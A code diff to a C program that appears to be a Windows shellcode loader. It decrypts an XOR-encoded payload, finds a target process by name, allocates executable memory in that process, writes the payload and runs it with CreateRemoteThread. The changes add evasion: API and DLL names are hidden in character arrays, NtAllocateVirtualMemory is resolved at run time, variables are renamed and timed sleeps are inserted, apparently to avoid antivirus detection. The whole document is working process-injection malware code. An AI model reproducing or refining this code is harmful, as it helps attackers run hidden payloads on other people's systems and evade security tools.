@@ -25,6 +25,22 @@ EXTERN_C NTSTATUS NTAPI NtOpenProcess(
     PCLIENT_ID         ClientId
 );
 
+typedef NTSTATUS(NTAPI *pfnNtAllocateVirtualMemory)(
+    HANDLE ProcessHandle,
+    PVOID *BaseAddress,
+    ULONG_PTR ZeroBits,
+    PSIZE_T RegionSize,
+    ULONG AllocationType,
+    ULONG Protect
+);
+
+
+unsigned char NLLEovW[] = { 'n', 't', 'd', 'l', 'l', '.', 'd', 'l', 'l', 0x0 };
+unsigned char sKDwiG[] = { 'N', 't', 'D', 'e', 'l', 'a', 'y', 'E', 'x', 'e', 'c', 'u', 't', 'i', 'o', 'n', 0x0 };
+unsigned char lZWAbLq[] = { 'Z', 'w', 'S', 'e', 't', 'T', 'i', 'm', 'e', 'r', 'R', 'e', 's', 'o', 'l', 'u', 't', 'i', 'o', 'n', 0x0 };
+unsigned char jGhy[] = { 'N', 't', 'A', 'l', 'l', 'o', 'c', 'a', 't', 'e', 'V', 'i', 'r', 't', 'u', 'a', 'l', 'M', 'e', 'm', 'o', 'r', 'y', 0x0 };
+
+
 // Custom GetProcAddress function
 typedef FARPROC(__stdcall* ARPROC)(HMODULE, LPCSTR);
 
@@ -47,9 +63,9 @@ FARPROC myGetProcAddress(HMODULE hModule, LPCSTR lpProcName) {
     return NULL;
 }
 
-static NTSTATUS(__stdcall *NtDelayExecution)(BOOL Alertable, PLARGE_INTEGER DelayInterval) = (NTSTATUS(__stdcall*)(BOOL, PLARGE_INTEGER))myGetProcAddress(GetModuleHandle("ntdll.dll"), "NtDelayExecution");
+static NTSTATUS(__stdcall *NtDelayExecution)(BOOL Alertable, PLARGE_INTEGER DelayInterval) = (NTSTATUS(__stdcall*)(BOOL, PLARGE_INTEGER))myGetProcAddress(GetModuleHandle(NLLEovW), sKDwiG);
 
-static NTSTATUS(__stdcall *ZwSetTimerResolution)(IN ULONG RequestedResolution, IN BOOLEAN Set, OUT PULONG ActualResolution) = (NTSTATUS(__stdcall*)(ULONG, BOOLEAN, PULONG))myGetProcAddress(GetModuleHandle("ntdll.dll"), "ZwSetTimerResolution");
+static NTSTATUS(__stdcall *ZwSetTimerResolution)(IN ULONG RequestedResolution, IN BOOLEAN Set, OUT PULONG ActualResolution) = (NTSTATUS(__stdcall*)(ULONG, BOOLEAN, PULONG))myGetProcAddress(GetModuleHandle(NLLEovW), lZWAbLq);
 
 static void SleepShort(float milliseconds) {
     static bool once = true;
@@ -66,7 +82,7 @@ static void SleepShort(float milliseconds) {
 
 unsigned char ofthekernel[] = { 'k','e','r','n','e','l','3','2','.','d','l','l', 0x0 };
 
-LPVOID(WINAPI* Alooccc_Virtuu)(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
+LPVOID(WINAPI* Vir_Alo)(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
 
 char XOR_VARIABLE[] = "XOR_KEY";
 
@@ -105,7 +121,7 @@ int aRandom1(char* eRandom5, unsigned int eRandom5_len, char* key, size_t keylen
 int bRandom2(const char* procname) {
     HANDLE hProcSnap;
     PROCESSENTRY32 pe32;
-    int pidNumber = 0;
+    int pidofNumber = 0;
 
     hProcSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
     if (INVALID_HANDLE_VALUE == hProcSnap) return 0;
@@ -118,29 +134,56 @@ int bRandom2(const char* procname) {
 
     while (Process32Next(hProcSnap, &pe32)) {
         if (lstrcmpiA(procname, pe32.szExeFile) == 0) {
-            pidNumber = pe32.th32ProcessID;
+            pidofNumber = pe32.th32ProcessID;
             break;
         }
     }
 
     CloseHandle(hProcSnap);
 
-    return pidNumber;
+    return pidofNumber;
 }
 
 int cRandom3(HANDLE hProc, unsigned char* eRandom5, unsigned int eRandom5_len) {
-    LPVOID pRemteCode = NULL;
+    LPVOID pRemoteCode = NULL;
     HANDLE hThread = NULL;
+    SIZE_T regionSize = eRandom5_len;
+    ULONG protect = PAGE_EXECUTE_READ;
+    ULONG allocationType = MEM_COMMIT;
 
-    pRemteCode = VirtualAllocEx(hProc, NULL, eRandom5_len, MEM_COMMIT, PAGE_EXECUTE_READ);
-    WriteProcessMemory(hProc, pRemteCode, (PVOID)eRandom5, (SIZE_T)eRandom5_len, NULL);
-
-    hThread = CreateRemoteThread(hProc, NULL, 0, pRemteCode, NULL, 0, NULL);
-    if (hThread != NULL) {
-        WaitForSingleObject(hThread, 500);
-        return 0;
+    // Load NtAllocateVirtualMemory dynamically
+    HMODULE hNtDll = GetModuleHandle(TEXT(NLLEovW));
+    if (hNtDll == NULL) {
+        return 1; // Handle error
     }
-    return -1;
+
+    pfnNtAllocateVirtualMemory NtAllocateVirtualMemory = (pfnNtAllocateVirtualMemory)GetProcAddress(hNtDll, jGhy);
+    if (NtAllocateVirtualMemory == NULL) {
+        return 1; // Handle error
+    }
+
+    // Call NtAllocateVirtualMemory to allocate memory in the remote process
+    NTSTATUS status = NtAllocateVirtualMemory(hProc, &pRemoteCode, 0, &regionSize, allocationType, protect);
+    if (status != 0) {
+        return 1; // Handle error
+    }
+
+    // Write eRandom5 to the allocated memory
+    SIZE_T bytesWritten = 0;
+    BOOL writeResult = WriteProcessMemory(hProc, pRemoteCode, eRandom5, eRandom5_len, &bytesWritten);
+    if (!writeResult || bytesWritten != eRandom5_len) {
+        return 1; // Handle error
+    }
+
+    // Create a remote thread to execute the code
+    hThread = CreateRemoteThread(hProc, NULL, 0, (LPTHREAD_START_ROUTINE)pRemoteCode, NULL, 0, NULL);
+    if (hThread != NULL) {
+        WaitForSingleObject(hThread, 500); // Wait for the thread to finish
+        CloseHandle(hThread); // Close the thread handle
+        return 0; // Success
+    }
+
+    return -1; // Error creating remote thread
 }
 
 void gRandom7(char* tadas, size_t tadas_len, char* XOR_VARIABLE, size_t XOR_VARIABLE_len) {
@@ -162,7 +205,7 @@ int main(void) {
     HANDLE th;
     DWORD oldprotect = 0;
 
-    int pidNumber = 0;
+    int pidofNumber = 0;
     HANDLE hProc = NULL;
 
     char dRandom4[] = KEYVALUE
@@ -174,11 +217,11 @@ int main(void) {
 
     SleepShort(3000);
 
-    Alooccc_Virtuu = (LPVOID(WINAPI*)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD))myGetProcAddress(GetModuleHandle(ofthekernel), fRandom6);
+    Vir_Alo = (LPVOID(WINAPI*)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD))myGetProcAddress(GetModuleHandle(ofthekernel), fRandom6);
 
     SleepShort(4000);
 
-    Random8_mem = Alooccc_Virtuu(0, eRandom5_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    Random8_mem = Vir_Alo(0, eRandom5_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
     SleepShort(5000);
     aRandom1((char*)eRandom5, eRandom5_len, dRandom4, sizeof(dRandom4));
 
@@ -190,14 +233,14 @@ int main(void) {
 
     gRandom7((char*)Random9, sizeof(Random9), XOR_VARIABLE, sizeof(XOR_VARIABLE));
 
-    pidNumber = bRandom2(Random9);
+    pidofNumber = bRandom2(Random9);
 
-    if (pidNumber) {
+    if (pidofNumber) {
         HANDLE hProc;
         OBJECT_ATTRIBUTES objAttr;
         CLIENT_ID clientId;
 
-        clientId.UniqueProcess = (HANDLE)pidNumber;
+        clientId.UniqueProcess = (HANDLE)pidofNumber;
         clientId.UniqueThread = 0;
 
         InitializeObjectAttributes(&objAttr, NULL, 0, NULL, NULL);
